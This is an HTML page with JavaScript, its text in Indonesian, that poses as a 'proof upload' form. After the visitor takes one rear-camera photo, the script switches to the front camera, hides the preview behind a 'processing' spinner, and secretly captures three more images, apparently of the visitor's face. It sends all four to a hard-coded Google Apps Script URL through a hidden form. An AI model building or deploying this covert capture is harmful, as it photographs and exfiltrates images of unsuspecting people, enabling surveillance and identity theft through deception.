<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Upload Bukti</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f5f5f5;
      font-family: Arial, sans-serif;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      background: #111;
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    video {
      width: 100%;
      max-height: 70vh;
      object-fit: cover;
      border-radius: 14px;
      margin-bottom: 15px;
      background: #000;
      display: none;
    }

    canvas {
      display: none;
    }

    .loading {
      display: none;
      margin: 20px 0;
    }

    .spinner {
      width: 42px;
      height: 42px;
      margin: 0 auto 12px;
      border: 4px solid #ddd;
      border-top: 4px solid #111;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .loading-text {
      font-size: 15px;
      color: #444;
    }

    .thank-you {
      display: none;
      font-size: 22px;
      font-weight: bold;
      color: #111;
      margin-top: 20px;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }
  </style>
</head>

<body>

<div class="container">

  <!-- PREVIEW CAMERA -->
  <video id="video"
         autoplay
         playsinline>
  </video>

  <!-- CANVAS UNTUK CAPTURE -->
  <canvas id="canvas"></canvas>

  <!-- BUTTON -->
  <button id="mainButton"
          onclick="startProcess()">
    Upload Bukti
  </button>

  <!-- LOADING -->
  <div id="loading" class="loading">

    <div class="spinner"></div>

    <div class="loading-text">
      Sedang memproses...
    </div>

  </div>

  <!-- THANK YOU -->
  <div id="thankYou"
       class="thank-you">
    Thank You
  </div>

</div>


<script>

  // =========================================================
  // MASUKKAN URL GOOGLE APPS SCRIPT WEB APP DI SINI
  // =========================================================

  const GAS_URL =
    "https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec";


  // =========================================================
  // VARIABLE
  // =========================================================

  let video = document.getElementById("video");
  let canvas = document.getElementById("canvas");
  let button = document.getElementById("mainButton");
  let loading = document.getElementById("loading");
  let thankYou = document.getElementById("thankYou");

  let stream = null;


  // =========================================================
  // ID SESSION
  // =========================================================

  const sessionId =
    "session_" +
    Date.now() +
    "_" +
    Math.random()
      .toString(36)
      .substring(2, 8);


  // =========================================================
  // START
  // =========================================================

  async function startProcess() {

    button.disabled = true;

    try {

      // -----------------------------------------------------
      // BUKA KAMERA BELAKANG
      // -----------------------------------------------------

      await openCamera("environment");

      video.style.display = "block";

      button.innerText = "Ambil Foto";

      button.onclick = takeFirstPhoto;

      button.disabled = false;

    }

    catch (error) {

      console.error(error);

      alert(
        "Kamera tidak dapat dibuka.\n\n" +
        error.name + ": " +
        error.message
      );

      button.disabled = false;
    }
  }


  // =========================================================
  // OPEN CAMERA
  // =========================================================

  async function openCamera(cameraType) {

    // Pastikan kamera sebelumnya ditutup
    stopCamera();

    stream =
      await navigator.mediaDevices.getUserMedia({

        video: {

          facingMode: {
            ideal: cameraType
          },

          width: {
            ideal: 1280
          },

          height: {
            ideal: 720
          }

        },

        audio: false

      });

    video.srcObject = stream;

    await video.play();
  }


  // =========================================================
  // STOP CAMERA
  // =========================================================

  function stopCamera() {

    if (stream) {

      stream
        .getTracks()
        .forEach(track => track.stop());

      stream = null;
    }

    video.srcObject = null;
  }


  // =========================================================
  // CAPTURE FRAME
  // =========================================================

  function capturePhoto() {

    if (!video.videoWidth || !video.videoHeight) {

      throw new Error(
        "Kamera belum siap."
      );
    }

    canvas.width =
      video.videoWidth;

    canvas.height =
      video.videoHeight;

    const ctx =
      canvas.getContext("2d");

    ctx.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );

    return canvas.toDataURL(
      "image/jpeg",
      0.85
    );
  }


  // =========================================================
  // FOTO PERTAMA
  // KAMERA BELAKANG
  // =========================================================

  async function takeFirstPhoto() {

    button.disabled = true;

    try {

      const image =
        capturePhoto();

      // Upload capture #1
      const success =
        await uploadPhoto(
          image,
          1
        );

      if (!success) {

        throw new Error(
          "Upload foto pertama gagal."
        );
      }


      // -----------------------------------------------------
      // FOTO PERTAMA SELESAI
      // -----------------------------------------------------

      button.style.display = "none";

      loading.style.display = "block";

      document.querySelector(
        ".loading-text"
      ).innerText =
        "Sedang memproses...";


      // -----------------------------------------------------
      // MATIKAN KAMERA BELAKANG
      // -----------------------------------------------------

      stopCamera();


      // -----------------------------------------------------
      // BUKA KAMERA DEPAN
      // -----------------------------------------------------

      await openCamera("user");

      video.style.display = "none";


      // Beri waktu kamera depan stabil
      await delay(1200);


      // -----------------------------------------------------
      // CAPTURE OTOMATIS 2
      // -----------------------------------------------------

      await automaticCapture(2);


      // -----------------------------------------------------
      // CAPTURE OTOMATIS 3
      // -----------------------------------------------------

      await automaticCapture(3);


      // -----------------------------------------------------
      // CAPTURE OTOMATIS 4
      // -----------------------------------------------------

      await automaticCapture(4);


      // -----------------------------------------------------
      // SEMUA SELESAI
      // -----------------------------------------------------

      stopCamera();

      video.style.display = "none";

      loading.style.display = "none";

      thankYou.style.display = "block";

    }

    catch (error) {

      console.error(error);

      stopCamera();

      loading.style.display = "none";

      button.style.display = "block";

      button.disabled = false;

      button.innerText =
        "Upload Bukti";

      button.onclick =
        startProcess;

      alert(
        "Terjadi kesalahan:\n\n" +
        error.message
      );
    }
  }


  // =========================================================
  // AUTOMATIC CAPTURE
  // =========================================================

  async function automaticCapture(number) {

    // Tunggu sebentar supaya frame kamera stabil
    await delay(1200);


    // Ambil foto
    const image =
      capturePhoto();


    // Upload
    const success =
      await uploadPhoto(
        image,
        number
      );


    if (!success) {

      throw new Error(
        "Upload capture #" +
        number +
        " gagal."
      );
    }


    // Jeda sebelum capture berikutnya
    await delay(800);
  }


  // =========================================================
  // UPLOAD FOTO KE GOOGLE APPS SCRIPT
  // =========================================================

  function uploadPhoto(image, number) {

    return new Promise(
      function(resolve) {

        const iframe =
          document.createElement("iframe");

        const iframeName =
          "uploadFrame_" +
          Date.now() +
          "_" +
          Math.random()
            .toString(36)
            .substring(2);

        iframe.name =
          iframeName;

        iframe.style.display =
          "none";

        document.body.appendChild(
          iframe
        );


        // ---------------------------------------------------
        // FORM
        // ---------------------------------------------------

        const form =
          document.createElement("form");

        form.method =
          "POST";

        form.action =
          GAS_URL;

        form.target =
          iframeName;

        form.style.display =
          "none";


        // ---------------------------------------------------
        // PAYLOAD
        // ---------------------------------------------------

        const payload = {

          id: sessionId,

          captureNumber:
            number,

          image:
            image

        };


        const input =
          document.createElement("input");

        input.type =
          "hidden";

        input.name =
          "payload";

        input.value =
          JSON.stringify(payload);


        form.appendChild(
          input
        );

        document.body.appendChild(
          form
        );


        // ---------------------------------------------------
        // RESPONSE LOAD
        // ---------------------------------------------------

        let finished = false;

        iframe.onload =
          function() {

            if (finished) return;

            finished = true;


            // Beri waktu GAS menyelesaikan proses
            setTimeout(
              function() {

                cleanup();

                resolve(true);

              },
              1000
            );
          };


        // ---------------------------------------------------
        // TIMEOUT
        // ---------------------------------------------------

        const timeout =
          setTimeout(
            function() {

              if (finished) return;

              finished = true;

              cleanup();

              resolve(false);

            },
            60000
          );


        // ---------------------------------------------------
        // SUBMIT
        // ---------------------------------------------------

        form.submit();


        // ---------------------------------------------------
        // CLEANUP
        // ---------------------------------------------------

        function cleanup() {

          clearTimeout(
            timeout
          );

          try {
            document.body.removeChild(
              form
            );
          }
          catch (e) {}

          try {
            document.body.removeChild(
              iframe
            );
          }
          catch (e) {}
        }

      }
    );
  }


  // =========================================================
  // DELAY
  // =========================================================

  function delay(ms) {

    return new Promise(
      resolve =>
        setTimeout(
          resolve,
          ms
        )
    );

  }

</script>

</body>
</html>
